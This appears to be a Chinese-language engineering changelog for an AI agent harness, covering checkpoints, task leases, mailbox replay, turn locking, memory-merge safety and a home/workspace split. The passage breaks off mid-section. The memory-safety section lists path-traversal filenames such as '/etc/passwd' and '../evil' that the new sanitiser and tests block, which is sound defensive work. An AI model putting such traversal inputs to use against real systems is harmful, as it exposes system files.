Rich Markdown 解析 54ms，自适应节流 108ms；10k 行布局有界缓存常驻 7.5 MiB/峰值 8.2 MiB，
- 长会话首载窗口调整后全量回归 1298 passed / 1 skipped；Ruff、diff check 通过。

## 全局 checkpoint GC 保护复核

对本地 `.cache/checkpoints` 仅执行 `gc_all_checkpoints(max_nodes=5, dry_run=True)`：22 个会话、
191 个节点，计划回收 92 个、8,625,056 字节；逐会话核验候选集均保留当前 head 与全部带标签节点，
没有会话超出 keep=5。未执行删除。

加强 `test_global_gc_visits_each_session_and_keeps_labels`：先断言多会话 dry-run 不改节点数/head，
再执行临时目录中的 GC，断言各会话 head 与带标签节点目录均保留、回收后节点数符合 keep。
`tests/test_checkpoints.py` 46 passed，增量 Ruff 通过。

## Checkpoint 快照压缩与命令层拆分

P1 存储：新 checkpoint 把 canonical messages 写为 `messages.jsonl.gz`（gzip level 6，
`mtime=0`），读取时优先 `.gz`、回退旧版明文 `messages.jsonl`；`snapshot_path()` 返回实际存在的
文件，rewind 事件记录实际路径，`SessionEventStore` 在重放时按后缀解压。旧明文节点不在读取时
被隐式改写，仍由 `/checkpoint-gc` 整体回收。

本机对 20 个最大快照做只读抽样：原始 5.14 MiB，gzip 后 1.43 MiB，比例 0.278（约省 72%）。
新增用例覆盖新节点写 `.gz`、旧明文仍可读、gzip 快照 replay。

P2 拆分：checkpoint 列表/GC 预览与执行/rewind 报告和重放从 `harness.py` 移到
`src/checkpoint_commands.py`；`harness.py` 保留读取 `CHECKPOINT_DIR`、
`CHECKPOINT_MAX_NODES`、`CHECKPOINT_KEEP_LABELED` 的薄包装，因此现有命令入口和测试导入路径
不变。`harness.py` 从 2735 行降到 2565 行，新模块 211 行。

P2b：把 `HarnessApp` 的 24 个会话生命周期方法（`/new` `/rename` `/fork` `/sessions`
`/compact` 以及 checkpoint/rewind/GC）原样移到 `src/ui/session_actions.py` 的
`SessionActionsMixin`；`harness_app.py` 从 2327 行降到 1903 行，新模块 444 行。App 的
继承顺序改为 `SessionActionsMixin, App`，方法仍通过 `self` 使用原有状态；同时把只服务于
这些命令的 `_strip_ansi` 和 modal 导入移入新模块，避免两套名字。AST 核对 mixin 恰含
预期的 24 个方法、App 无重复方法。

验证：全量 **1261 passed / 1 skipped**（P2b 定向 142 passed），5 条 warning 仍来自飞书 SDK
的 pkg_resources 弃用；`ruff check .` 与 `git diff --check` 通过。真实终端验收记录仍未补齐，
等待用户提供终端/版本信息。

## Pending 工具恢复分级

新增 `src/tool_recovery.py`，把「assistant 已发出 tool_call、结果未落盘」的 pending
调用按风险分为三类，只生成恢复建议，不执行任何工具：

- `read-only`：读文件、检索、读文档、`web_fetch`、只读查询以及 `is_readonly_command`
  判定为只读的 bash；可安全重复，仍由模型决定是否调用。
- `idempotent`：整文件 `write`、`todo_write`、带状态保护的 claim/complete、
  `cancel_cron`、`kill_background` 等；重复会收敛或被拒绝，仍要求先核对状态。
- `destructive`：`edit`/`apply_patch`、创建任务/cron/teammate、发送消息、消费 inbox、
  worktree 删除及所有未知/MCP 工具；可能已部分生效或重复副作用，禁止盲重试。

`SessionEventStore.close_interrupted_tools()` 的 synthetic tool result 保留
“outcome is unknown”，并附带对应类别的行动建议；`recovery_message()` 按
read-only → idempotent → destructive 分组列出名称与 call id。修正了
`resume_agent_loop()` 的旧顺序问题：原先先 `recover_pending=True` 写入
`tool_recovery` 事件，随后再取 pending 时集合已为空，恢复提示实际不会注入；现在
先收集提示再闭合调用。

验证：`tests/test_tool_recovery.py` 覆盖三类工具、malformed 参数/调用、
`close_message`/`resume_message`、rebuild 分类结果与 resume 注入顺序；
定向 80 passed（含 session/tool interruption/history projection），Ruff 通过。

## 任务认领跨进程锁

新增 `src/file_lock.py`：POSIX 用 `fcntl.flock`、Windows 用 `msvcrt.locking` 的
非阻塞轮询封装，超时抛 `FileLockTimeout`，进程退出时由 OS 释放。`task_system`
新增 `task_transaction()`：外层同时持有进程内 `RLock` 与 `.cache/tasks/.tasks.lock`，
嵌套调用复用深度计数；`create_task`/`claim_task`/`complete_task`/`save_task` 统一走
该事务，`save_task` 不再单独抢锁。

新增 `tests/test_task_locking.py`：两个 spawn 进程在拉长读改写窗口后同时 claim，
断言恰好一个成功；原有线程并发用例继续通过。定向 43 passed，Ruff 通过。

## MCP 调用遥测

MCP sync wrapper 现在记录 server、工具名、墙钟耗时、`status` 和 `error_type`：
`timeout` / `not_connected` / `server_error`，以及 bridge 异常的真实类名。事件不含
参数与返回内容；sink 抛错被吞掉，不改变工具结果。

主 agent 在 `_run_tool_batch()` 的每次工具执行外打开 `mcp_bridge.telemetry_sink()`，
把事件追加为 session JSONL 的 `mcp_call`。sink 用 thread-local 而非 ContextVar：
并行批次在 ThreadPoolExecutor worker 内执行，ContextVar 不会从提交线程自动继承。
每个 worker 自己打开/关闭 sink，主线程串行路径同样处理；未配置 MCP 时
`sys.modules` 查不到 bridge，直接 `nullcontext()`，不额外导入 SDK。

新增 `tests/test_mcp_telemetry.py` 覆盖成功、四类错误、sink 失败隔离、串行批次事件、
并行 worker 事件；MCP 相关 22 passed，Ruff 通过。

## 子代理独立运行日志

`task` 子代理原先只有一段返回文本，中途的 LLM 消息、工具调用和失败位置都不落盘。
新增 `src/subagent_events.py` 的 `SubagentRecorder`：

- 每次运行写 `.cache/sessions/subagents/session_subagent_<id>.jsonl`，记录
  system/user/assistant/tool 消息以及 `subagent_started` / `subagent_finished`；
  该事件流可被 `SessionEventStore.rebuild_openai_history()` 还原，工具中途退出时
  留下的 pending 调用也能按现有规则检查；
- 父会话只追加两个轻量引用事件（id、描述、状态、轮数、耗时、子日志相对路径），
  `/sessions` 仍只扫顶层 `session_*.jsonl`，内部运行不会出现在会话列表；
- 状态为 `completed` / `limit` / `error` / `cancelled`，结束事件由 `finally` 保证
  恰好一次；错误只记录类型和截断后的信息；
- 所有写入 best-effort：目录不可写、磁盘满或父会话引用失败都不改变子代理结果。

新增 `tests/test_subagent_events.py`：成功路径校验子会话角色序列、父引用和跨实例
seq 追加，失败路径校验错误记录后原样重抛，另覆盖记录器构造失败隔离和无会话上下文。
子代理相关定向 9 passed，Ruff 通过。

## Mailbox 消息 id 与未确认重放

`MessageBus` 从「读完即删文件」改为两步消费：

- `send()` 为每条消息分配 `msg_<uuid>`；旧消息没有 id 时，读取阶段按原始行内容生成
  稳定的 `legacy-<hash>`，因此升级前留在邮箱里的消息也能正常 ack；
- `claim_inbox()` 只返回未确认消息、不修改邮箱，重复调用即重放；`ack()` 按 id 删除，
  重写时先写临时文件再 `Path.replace`，并用跨进程 `exclusive_file_lock` 包住
  send/claim/ack，避免并行会话的 append 被 ack 重写吞掉；
- `read_inbox()` 保留旧的「读取后立即确认」语义；损坏/半行消息跳过，并在下一次
  ack 重写时清理；
- teammate 循环、`idle_poll()` 和 Lead 的 `consume_lead_inbox()` 统一改为
  claim → 注入对话 → ack。进程在注入后、ack 前退出时消息仍在邮箱，重启后重放；
  这是 at-least-once，shutdown/plan response 的处理本身幂等。ack 失败只告警，
  下一轮重放而不是丢消息。

`tests/test_runtime_reliability.py` 新增消息 id/claim/ack/replay、claim 后新到消息
不被误删、legacy id 稳定、损坏行清理、Lead 路由后 ack、idle_poll 注入/shutdown
先 ack；`tests/test_session_workspace.py` 校验 teammate 处理 shutdown 后确认。
mailbox/teammate 相关定向 55 passed，Ruff 通过。全量回归 **1331 passed / 1 skipped**
（symlink 在本机不可用），5 条 warning 仍来自飞书 SDK。

## teammate 独立运行日志

teammate 线程原先同样只把最终一句汇报送回 Lead，中间的工具调用和失败位置不落盘。
`subagent_events.py` 抽出 `AgentRunRecorder`，新增 `TeammateRecorder`：

- 每次 teammate 启动写 `.cache/sessions/teammates/session_teammate_<name>_<id>.jsonl`，
  记录 system/user、inbox 注入、assistant 消息、tool 结果和图片附件；
- 父会话只追加 `teammate_started` / `teammate_finished`，带 teammate 名、run id、role
  和子日志相对路径；`/sessions` 仍看不到内部运行；
- 父 store 在 Lead 线程显式传给 recorder，因为 teammate 线程不继承 checkpoint manager
  的 ContextVar；父会话与子线程写同一 store 时依赖 `SessionEventStore` 的路径级锁；
- 空闲期 `idle_poll()` 注入的 inbox/自动认领消息也一并写入子日志，回放时不会出现
  “助手在回应一条日志里不存在的任务”；
- 结束事件由 `finally` 保证恰好一次，状态 `completed` / `error` / `cancelled`，并统一
  清理 `active_teammates`、投递最终汇报；记录失败只丢日志，不改变执行。

新增 `tests/test_teammate_events.py`：成功路径校验父子日志、角色序列和任务内汇报；
空闲期注入消息落盘；LLM 异常校验 error 字段后线程正常收尾；另覆盖无父会话与记录器构造失败。

## 子代理/teammate 日志随父会话归档

`SessionArchive` 现在按父会话的 `subagent_started` / `teammate_started` 事件收集 `log`
引用：

- 归档时依次移动 checkpoints、子日志、父日志；任一步失败按反序回滚，空目录一并清理；
  被手工删掉的子日志直接跳过，不阻塞归档；
- 恢复时校验归档目录、子目录和文件均非链接/重解析点，目标已存在则整体拒绝，绝不覆盖；
- 永久删除把 `subagents/`、`teammates/` 加入允许集合，并拒绝其中的未知文件。

子日志路径必须恰为 `subagents|teammates/session_*.jsonl`，解析后仍位于会话存储目录；
引用越界直接拒绝归档。父日志中的相对路径在归档后仍然有效。

新增 `tests/test_session_child_logs.py`：归档/恢复/删除、目标冲突、越界引用、子目录未知
文件、手工删除的子日志和父日志移动失败后的回滚；原有 cleanup/delete/review 用例保持通过。

## 任务租约与自动认领

任务新增 `claimed_at`、`lease_expires`、`attempts`，默认租约 1 小时：

- `claim_task()` 允许回收租约过期的 in_progress 任务，返回 `recovered expired lease`；
  没有租约字段的旧任务视为失效，避免升级后任务永久卡住；
- `complete_task(owner=...)` 在 owner 不匹配时拒绝，防止租约被回收后旧 teammate 误完成；
- `claim_next_task()` 在事务内重扫候选：pending 按创建顺序优先，其次是过期任务
  （按 attempts、claimed_at、id）；认领失败会继续尝试后续候选；
- teammate 的 claim/complete handler 改为传自己的名字，不再全部记成 `agent`；
  `idle_poll()` 使用 `claim_next_task()`，7 秒轮询内不再固定抢第一个任务。

新增 `tests/test_task_system.py` 的租约回收、活跃租约保护、owner 校验和候选顺序用例，
`tests/test_runtime_reliability.py` 覆盖 idle 自动认领写租约。claim_task 描述变化同步更新了
`tests/test_tool_schemas.py` 的 schema 指纹。本轮三项（teammate 日志、子日志归档、任务租约）
全量回归 **1348 passed / 1 skipped**（symlink 在本机不可用），5 条 warning 仍来自飞书 SDK，
Ruff 通过。

## 长任务租约续期

固定 1 小时的租约对长任务不友好：teammate 正在干活，租约到期就被别人回收。
新增 `task_system.renew_lease(task_id, owner, lease_seconds)`，teammate 循环每轮
开始自动续租：

- 续租在 `task_transaction()` 内校验状态与 owner，只刷新 `lease_expires`；
  `claimed_at`/`attempts` 不动，过期任务的公平排序仍按首次认领时间；
- `wt_ctx['task_id']` 由 claim 工具与 idle 自动认领写入、complete 清空；
  `_renew_task_lease()` 每轮据此续租，失败或被拒（任务被抢走/已完成）只打印告警；
- 真正的保护仍是 `complete_task` 的 owner 校验：被回收的任务无法被旧持有者标记完成。

`tests/test_task_system.py` 覆盖续期扩展、历史字段不变、owner 拒绝与非进行中拒绝；
`tests/test_teammate_events.py` 验证每轮循环续租一次；`tests/test_runtime_reliability.py`
的 idle 认领用例补验 `wt_ctx['task_id']`。

## 孤儿子日志回收

`subagents/`、`teammates/` 里没被任何父会话引用的日志（父引用写失败、手工删父日志）
会永久堆积。`session_cleanup` 新增扫描与清理：

- `orphan_child_logs()` 读全部顶层父日志收集 `log` 引用；无引用且 mtime 超过保留期
  （默认 30 天）才算孤儿——正在写入的运行日志 mtime 新，天然豁免；
- 任何父日志读不出来（OSError）整轮放弃，宁可不删也不误删；归档目录不参与扫描；
- `purge_orphan_child_logs()` 是显式删除入口，单个失败计数并继续；遇到链接存储根目录、子目录或文件跳过；
- `harness.start_storage_maintenance()` 在交互入口起后台 daemon 线程；默认只预览孤儿
  日志、不删除。仅显式传入 `purge_orphans=True` 时清理（只在测试临时目录验证）。

`tests/test_session_child_logs.py` 覆盖「只回收过期且无引用」「被引用的旧日志保留」
「父日志不可读整体放弃」。

## 旧 checkpoint 快照压缩迁移

升级前的节点还是明文 `messages.jsonl`，新节点直接写 `.gz`。`checkpoints.py` 新增
`migrate_legacy_checkpoints(base_dir)` 一次性补齐存量：

- 先写 `.gz`，再解压回读与明文逐条比对；默认保留明文副本，任何失败也保留明文；
- `.gz` 已存在且内容一致时默认记为 `skipped`，不一致则不动（读路径优先 `.gz`）；
- 只有显式传入 `remove_plain=True` 才删除经校验的明文；遇到链接/junction 存储根目录、节点或文件路径跳过。

迁移与孤儿**预览**共用 `start_storage_maintenance()`：交互启动后台线程各跑一次，
不阻塞会话。`tests/test_checkpoints.py` 覆盖迁移、幂等、链接路径、冲突对保留与损坏
保留；`tests/test_runtime_reliability.py` 验证默认不删除及显式授权删除（均为临时文件）。

## checkpoint 覆盖 bash 文件改动

此前回滚只覆盖 `write`/`edit` 触过的文件，bash 造成的改动只有漂移提示。现在两条
通道把 bash 改动纳入同一套 files 记录，恢复/冲突检测/回合清单免费获得覆盖：

- **基线脏文件（source='baseline'）**：`_begin_turn` 解析已存的 git 基线状态行，
  对当时已脏/未跟踪的文件预存 pre-image。同一节点内同一路径只记一次的规则
  让工具捕获自然跳过这些键，pre-image 因此是「节点开始时」的状态。
- **基线外变化（source='git'）**：`_seal` 把当前状态与基线对比，工具没碰过的
  新建/修改/删除补记录——干净跟踪文件的 pre-image 从 HEAD blob 取（节点开始
  内容），回合内新建记 `exists=False`（回溯=删除），bash 删掉的跟踪文件记
  post=''（回溯=重建），建了又删净变化为零不记录，敏感文件照旧只留元数据。

配套调整：`_git_status` 改用 `porcelain=v2 -z --untracked-files=all`（-z 关掉
quotePath 转义，中文路径不再变成 `\346...` 坏键；-uall 让未跟踪目录逐文件进
基线），`_git` 加 `--no-optional-locks` 与 UTF-8 解码；`_drift_files` 与基线同用
一份转换，行格式逐字可比；`plan_restore` 新增「pre-image 内容丢失」诚实跳过；
索引摘要里未变动的基线记录被过滤，`last`/`undo` 的「最近改文件节点」语义不受
影响。

`tests/test_checkpoints.py` 新增 14 例：bash 新建/修改/删除/重命名的回滚、基线
脏文件还原到节点开始、未跟踪文件内容还原、敏感文件不动、`_status_keys` 解析、
-uall 枚举、中文路径、pre-image 丢失报告与 last/undo 不被污染。

## TUI 本地后台动作收口

沿 P7 mixin 拆分，把 `!command` 的提交、后台执行和结果回写从 `HarnessApp` 移入
`src/ui/background_actions.py`，与 `/review`、`/watch` 放在同一职责模块。执行过程
保持原有 permission gate、turn control、工具块状态和 `_finish_local_operation()` 队列
调度语义；主 App 仍只负责把输入交给动作层和组装共享状态。

新增 `test_bang_shell_failure_restores_ui_gate_and_busy_state`：命令失败后工具块标为
failed、UI gate 与 busy 状态恢复；忙时再次提交 shell 命令不会启动第二个工具。定向 UI
回归 99 passed；完整回归 1457 passed / 1 skipped，Ruff、py_compile 与 diff 检查通过。

## Footer 无变化刷新跳过

`FooterMixin` 缓存最后一次送入 footer 的 widget 身份与格式化文本。周期刷新内容相同
时跳过 `Static.update()`；会话状态变化仍刷新，footer widget 被替换时也会重新渲染。
`test_footer_skips_unchanged_updates_but_refreshes_changed_state` 覆盖三种路径。完整
回归 1457 passed / 1 skipped，Ruff、py_compile 与 diff 检查通过。

## 会话选择器排序、范围与预览

`SessionPickerModal` 使用已有 session summary 支持最近更新/创建时间/名称排序、当前/全部
工作区范围、摘要搜索和随高亮变化的预览；`Alt+S`/`Alt+W` 在搜索框焦点时仍可用。当前
工作区按规范化路径比较，缺少 workspace 元数据的旧会话只出现在“全部工作区”。弹窗和
列表高度限制已覆盖 80×24、15 条结果。P5p 进一步把管理动作接入同一选择器，详见下节。

`test_session_picker_sort_scope_search_and_preview` 验证排序、范围、搜索、预览和小屏边界。
全量回归 1458 passed / 1 skipped；Ruff、py_compile 与 diff 检查通过。真实终端验收
按既定要求仍未执行。

## 会话选择器管理操作

选择器通过 `Alt+V` 异步切换活动/已归档列表。活动列表用 `Alt+R` 重命名、`Alt+A` 归档；
归档列表 Enter 恢复、`Alt+D` 删除。重命名写入现有 `session_title` 事件，不改历史消息。
归档/恢复/删除重新扫描选中项并复用 `session_cleanup_plan`、共享确认与后台执行；当前
会话不能归档，不提供直接删除活动会话，永久删除仍要求输入“删除”。归档存储读取在后台
线程执行，且没有新增存储格式或持久化状态。

临时存储端到端测试覆盖重命名、拒绝归档当前会话、取消/确认归档、恢复，以及错误删除
短语无副作用和正确短语删除。定向 UI/会话清理回归 101 passed；全量 1461 passed /
1 skipped，Ruff、py_compile 与 diff 检查通过。真实终端验收仍按既定要求待执行。

## 当前对话搜索

新增 `Ctrl+F` 搜索浮层，输入时经短暂防抖在后台扫描当前会话完整历史与已生成的 transcript
块。`Enter` / `Shift+Enter` 循环定位到下一/上一条命中；命中块高亮，摘要和命中计数显示在
浮层中。跳转到尚未载入的历史消息时沿用分页加载，不要求启动时渲染完整历史。

历史消息块使用 `history:<index>` 稳定 ID，以便跨页定位。该路径同时暴露布局的前缀插入缺陷：
布局曾把 `prepend` 误当作尾部追加，导致块索引重复；现在根据首块 ID 识别分页前插并重建布局。
Textual 回归覆盖全历史及新增 transcript 块搜索、旧页加载、前后循环、高亮、无结果和关闭后清理。
HarnessApp 定向 71 passed；全量 **1462 passed / 1 skipped**，Ruff、`py_compile` 与 diff 检查通过，
另有 5 条飞书 SDK 弃用警告。真实终端验收仍未执行。

## 命令面板

`Ctrl+Shift+P` 打开命令面板；数据直接来自共享命令注册表（包含动态技能命令），使用现有
`fuzzy_filter` 按名称和描述匹配，并按命令/技能分组。选择无参数提示的命令交给既有
`submit_text` / `_handle_command` 路由；带参数提示时只填入 `/{name} ` 并聚焦 Composer，
不替用户执行带参数操作。命令面板快捷键加入 `/hotkeys`。HarnessApp 与命令路由定向回归
84 passed；全量 **1463 passed / 1 skipped**，Ruff、`py_compile` 与 diff 检查通过，另有 5 条
飞书 SDK 弃用警告。真实终端快捷键与 80×24 验收仍待执行。

## 模型选择器

选择器原先只列出模型 ID 并默认高亮第一项；`_set_model` 只修改 `LLM_MODEL_ID`，在
`HARNESS_LLM_CONFIG` 下会被 `roles.main` 覆盖，provider 切换因此无效。现在候选来自模型注册表
和可解析的内置上下文窗口项，支持 fuzzy 搜索，显示 provider/model 与已登记 context window，
优先按最近状态事件中的有效模型高亮；没有有效状态时回退到配置解析的当前主角色。切换前先
解析目标并检查工具能力，再设 `HARNESS_MODEL_MAIN`，
同步 legacy `LLM_MODEL_ID`，并刷新状态栏的模型、context window 与当前占用。`/model` 参数补全
同步纳入配置注册表的模型名；Footer 与 `/status` 显示解析后的主角色模型。

没有引入价格标签：配置结构没有价格字段，硬编码价格会失真。也不把主角色的进程环境覆盖
描述成会话级持久化设置。自动化回归覆盖 legacy 环境变量、多 provider 配置、搜索、当前项、
参数补全及 context 占用更新；真实终端操作仍待验收。最终全量 **1465 passed / 1 skipped**，
Ruff、`py_compile` 与 `git diff --check` 均通过；5 条飞书 SDK 弃用警告。

## 记忆合并的数据安全与回合固定开销

做 Personal Agent 前置 profile 时定位到两类问题：记忆合并会先删后写，失败就丢记忆；
每回合的记忆召回与 token 估算在长会话上占 50–130 ms。

**合并改成「校验 → 暂存 → 先落新文件、再删旧文件」**（`memory.py`）。旧实现先
`unlink` 全部记忆再逐条写入，模型给出非空但字段不全的 JSON、或磁盘写到一半失败，
都会把旧记忆删空。现在先做纯数据校验（name/description/body 非空、type 在
`MEMORY_TYPES` 内、条数 ≤50、slug 不重复），任何一条不合格整批放弃；通过后写入
`MEMORY_DIR/.staging-<uuid>/` 并回读校验 frontmatter，再逐个 `Path.replace` 落盘，
最后才删除不在新集合里的旧文件。崩溃或写入失败发生在删除之前时，磁盘只会多出文件，
不会缺文件，下次合并仍能收敛。索引重建在最后一步，同样是临时文件 + 原子替换。

写入统一走 `_write_guard`：进程内 `RLock`（带重入深度，避免 flock 自锁）加
`exclusive_file_lock(.memory-write.lock)`，因此 daemon 与 TUI 并发写记忆不会互相覆盖
索引。文件名用 `[^a-z0-9._-] → '-'` 收敛，`../evil`、`..\evil`、`/etc/passwd` 都落在
`MEMORY_DIR` 内；`read_memory_file` 也加了目录边界检查（读路径原本可被文件名穿越）。
frontmatter 渲染把 name/description 压成单行，避免多行描述把正文吞掉。

**`estimate_size` 改用 C 层计数**（`tokens.py`）。原来 `sum(1 for ch in text if ord(ch) < 128)`
对每个字符跑一次 Python 循环；改成 `len(text.encode('ascii','ignore'))`，并在没有
`data:` 时跳过一次全串正则替换。实测 239 条会话 14.8→2.2 ms、783 条 55.5→7.5 ms；
对 51 个真实会话以及 data URI、harness_image、emoji、CJK 混合用例逐值相等，单位换算
与图片成本逻辑未变。

**记忆解析缓存**（`memory.py`）。`list_memory_files`/索引重建每次都重读并 YAML 解析
全部记忆文件，21 个文件约 19 ms/轮。现在按 `(path, size, mtime_ns)` 缓存
`(meta, body, raw)`，写入路径主动失效，外部修改靠 stat 兜底，上限 256 条。召回从
18–24 ms 降到 2–6 ms。缓存顺带让 `read_memory_file` 复用已读文本。

**缓存诊断采样**（`prompt_cache_debug.py` + `harness.py`）。
`HARNESS_DEBUG_CACHE=1` 时每次请求都要给 system + 全历史算指纹（239 条约 2.3 ms）。
新增 `HARNESS_DEBUG_CACHE_SAMPLE=N`：首个请求必采样建立基准，之后每 N 个采样一次，
跳过的请求不计算指纹；未采样返回 `None`，调用方按“无诊断数据”处理。

结果：本地稳态固定开销从 43–130 ms 降到 **7–24 ms/回合**（不含历史重建与模型调用）。
新增 `tests/test_memory_safety.py` 覆盖合并失败保留旧数据、暂存失败清理、文件名越界、
多行描述、并发写索引一致、缓存失效与外部修改；压缩测试新增逐值等价断言。
全量 **1477 passed / 1 skipped**，Ruff、`py_compile`、`git diff --check` 通过。
TUI 初始窗口默认值未改：实测 200→更小只能省 0.1–0.2 s，但会改变上滚体验，等真实终端验收后再定。

## Personal Agent 阶段 0：常驻服务与全局单回合

开始 Personal Agent 的第一批地基：让 cron 能随 API server 常驻并可停止，同时让
TUI / API / CLI / cron 不再静默并发写同一份缓存与工作区。

**为什么是全局单回合，而不是按会话加锁**：`turn_control` 的取消位、`METRICS`、
`permission_gate.use_ui` 都是进程级状态，两个会话并行时互相污染；不同会话还可能同时
改同一个 workspace。阶段 0 先保守串行，把并行留给“回合状态完全隔离 + 工作区级锁”的
下一阶段，而不是先造一套多端仲裁。

**协调器**（`src/turn_coordinator.py`）：进程内 `RLock` + 跨进程
`exclusive_file_lock(.cache/locks/agent-turn.lock)`。同一线程重入只加嵌套计数（TUI 在
worker 外层持槽），其他线程或进程立即抛 `TurnBusy`，不排队等一个可能几分钟的模型调用。
锁由 OS 持有，进程崩溃自动释放；锁文件残留不代表仍被占用，因此不做 PID 推断。
TUI 在空闲提交时先拿槽再画用户块，失败就把原文退回 Composer 并提示——避免“看起来
已发送、实际没进会话”。`_send_user` 的忙时排队路径不改：槽已由当前 worker 持有。

**cron 不丢任务**：`run_agent_turn_locked` 改成先拿槽、再 `consume_cron_queue()`；
槽被占用时直接返回，队列原样保留。旧顺序会先清队列再执行，一旦执行被拒绝就永久丢任务。

**API 契约**：普通消息在竞争时返回 `409`（`TurnBusy` 不会被吞成 500）；流式端点发
`event: error` 并带 `code: turn_busy`，客户端能区分“代理忙”与“回合失败”。

**scheduler 生命周期**（`src/scheduler_service.py`）：两个循环接受 `stop_event`，
`event.wait(interval)` 取代 `time.sleep`，置位后立即返回。服务 `start()` 幂等、只在首次
加载 durable jobs；`stop()` 置位并逐个 join，超时会记录 warning。API lifespan 只在
`owns_runtime` 时启动（`HARNESS_SCHEDULER=0` 可关），关闭时先停 scheduler 再关 MCP，
避免 cron 回合撞上已关闭的工具。注入 runtime 的 app 由调用方负责生命周期。
CLI 入口保留原来的 daemon 线程启动：进程退出即回收，而且入口测试 patch 的是
`harness.cron_scheduler_loop` 这类属性，改成服务反而绕过 patch 点。

**测试取舍**：原用例 `test_concurrent_real_turns_use_their_own_tools_prompt_and_checkpoints`
靠两个真实回合同时跑验证 workspace 隔离，与全局单回合直接冲突。改为“A 在模型调用中挂起时
B 被 `TurnBusy` 拒绝，随后 B 串行执行”，继续断言各自 prompt、工具输出与 checkpoint 归属；
并发语义的回归放在 `tests/test_turn_coordinator.py`。

结果：全量 **1492 passed / 1 skipped**；Ruff、`py_compile`、`git diff --check` 通过。
仍欠：会话元数据（rename/workspace/fork/archive/delete）的跨进程互斥、TUI 退出时等待
活动回合与 housekeeping、真实终端/daemon 验收。

## Personal Agent 阶段 0 第二批：会话写锁、回合生命周期与 TUI 关闭

单回合槽只保证“同一时刻一个回合”，并不阻止另一个进程同时 rename / 切 workspace /
归档同一会话；而 `SessionEventStore` 的 seq 去重只是进程内的 `_path_lock`，跨进程同时
追加会算出相同 seq，回放时直接报错。第二批补这层。

**会话写锁**（`src/session_locks.py`）：`locks/sessions/<id>.lock`。回合（`AgentRuntime.send`、
TUI worker、cron）整轮持有；rename / set_workspace / fork / manage_session 以
`timeout=0` 获取，失败抛 `SessionBusy`。API 映射 409（rename、fork 新增；workspace 与
session-action 原来就按 RuntimeError → 409）；TUI `/rename` 提示“会话正在执行任务”；
共享的 `apply_session_cleanup` 逐条拿锁、冲突记为失败并跳过，不会把正在写入的会话
文件移走。回合后的 title 写入是单次追加，用 5s 超时的锁，拿不到就跳过本轮标题。

**回合生命周期对称化**：`AgentRuntime.send` 与 cron `run_agent_turn_locked` 现在显式
`turn_control.begin_turn()/end_turn()`。这修掉一个真实 bug：上一个入口（比如 TUI 的
Esc）留下的取消位会让下一个入口的第一轮直接 `KeyboardInterrupt`——之前被“测试恰好
先跑过 TUI 用例”掩盖。进入回合清位、退出复位，也满足方案里“API 回合需要对称生命周期”
的前置条件。

**TUI 关闭**：`HarnessApp.wait_for_shutdown()` 置退出标志、`request_cancel()`、有界 join
worker，再 `wait_for_housekeeping(timeout)`；`ui.harness_app.run()` 在事件循环结束后调用，
之后才把事件总线交还 ANSI 渲染器。worker → UI 的 `call_from_thread` 收口到 `_ui_call`，
事件循环已退出时静默丢弃，避免退出瞬间的线程异常噪音。`run()` 对注入的 app 用
`getattr(..., 'wait_for_shutdown', None)`，保持测试替身可用。

测试：runtime 四个元数据操作在锁被占用时抛 `SessionBusy`；清理冲突不移动文件；
TUI rename 显示忙碌提示；`wait_for_shutdown` 会取消并 join worker、调用 housekeeping 等待；
API rename/fork 409。全量 **1496 passed / 1 skipped**，Ruff、`py_compile`、
`git diff --check` 通过。

仍未做：真实终端 / 真 daemon 验收（手机与 TUI 抢同一会话、SIGTERM 关闭、审批端到端）；
阶段 1 的 turn_id、终态事件、steer/interrupt、watcher。

## Personal Agent 阶段 1 第一块：turn_id、终态事件、steer 与 interrupt

阶段 1 的前置是“一个回合能被唯一识别、能被精确取消”。原先只有进程级的取消 Event，
而且成功回合并发一个 `turn_completed`，失败/取消没有任何终态记录；watcher 无法区分
“还在跑”和“已经结束”。

**回合身份**：`agent_loop` 开始时生成 `turn_id` 并写 `turn_started{turn_id, source}`。
`turn_source` 由入口传入（cli/tui/api/cron/steer）；`AgentRuntime.send(source=...)` 透传。
成功路径在 `_finish_response` 里保留 `turn_completed`（旧消费者），紧跟唯一的
`turn_terminal{status='completed', turn_id, source}`；失败/取消在调用边界记录
`turn_terminal{status='failed'|'cancelled', error_type}` 后原样抛出。测试断言失败回合没有
`turn_completed`、取消回合终态是 `cancelled`。

**按回合取消**：`TurnToken` + 活动注册表。`begin_turn()` 同线程重入时复用 token（测试会先
`begin_turn()` 再进 `agent_loop`），`request_cancel()` 优先取消活动 token、没有活动回合才
落到全局位；`end_turn()` 清位，避免“上一回合的 Esc 取消下一回合”。`AgentRuntime.send` 在
进入执行器前登记 token，使 `/interrupt` 和 `/steer` 在 `agent_loop` 真正开始前就能命中。

**steer**：`runtime.steer()` 在活动回合时把消息放进本回合的队列（`send` 注册
`steer_provider`），空闲时降级为普通 `send`。不属于本进程的回合（TUI 在别的进程）返回
409，而不是返回成功后丢失。`runtime.send` 会检查注入的 `run_turn` 是否接受
`steer_provider`/`turn_source`，避免强迫测试替身改签名。

**interrupt**：`runtime.interrupt()` 只取消按会话匹配的活动 token；`send` 把
`KeyboardInterrupt` 收敛成 `TurnCancelled`，普通端点映射 409，流式端点新增
`event: cancelled`。头文件还补充了 `headless` 的取消退出码处理。

**测试环境的一个真实风险**：项目根的 `.env` 配了真实 `LLM_BASE_URL`，而 `agent_loop`
在“目标模型不支持流式”时会走 `api.chat.completions.create`，绕过 `_stream_completion`
补丁——本轮排查时确实有测试打到了真实模型。`conftest` 现在默认把
`harness.client.chat.completions.create` 换成直接 `AssertionError` 的桩，没打桩就会显形；
`llm_config.get_client` 保持真实，供多 provider/缓存测试使用。

全量 **1505 passed / 1 skipped**；Ruff、`py_compile`、`git diff --check` 通过。
阶段 1 剩余：steer 幂等键、跨进程 steer/interrupt、飞书 watcher 与至少一次投递。

## 「换个目录启动就看不到会话」：把 agent home 和 workspace 分开

现象：在另一个目录运行 `entrypoint.py`，会话选择器显示 “No saved sessions”，记忆、快照
也跟着“消失”。根因不是选择器：`harness.py` 里所有状态目录都从
`WORKDIR = Path.cwd()` 推导——`SESSIONS_DIR = WORKDIR/'.cache'/'sessions'`，于是启动目录
决定了去哪读历史。换目录等于换了一套 home；而在同一进程里 `set_workspace` 切工作区时
又不会（也不该）搬动这些目录，两个概念一直混在一起。

**改法**（`src/paths.py`）：显式区分两个根。

- **home**：`HARNESS_HOME`，默认仓库根（`harness.py` 所在目录）；
- **workspace**：仍是 `Path.cwd()` / `use_workspace`，只影响工具执行、`@` 补全、项目技能；
